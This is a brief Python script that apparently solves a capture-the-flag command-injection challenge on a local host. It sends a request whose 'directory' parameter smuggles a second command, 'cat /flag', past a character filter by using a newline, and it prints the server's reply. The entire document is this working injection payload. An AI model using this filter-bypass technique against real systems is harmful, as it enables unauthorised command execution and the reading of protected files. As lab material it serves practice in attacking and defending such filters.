from requests import request

method = "GET"
site = "http://challenge.localhost"
port = 80

# Bypassing special character filtering to execute multiple commands in sequence.
params = { "directory": "/bin/cat  \n cat /flag " }

url = f"{site}:{port}/"

response = request(method, url, params = params)

print(f"\nResponse: {response.text}")
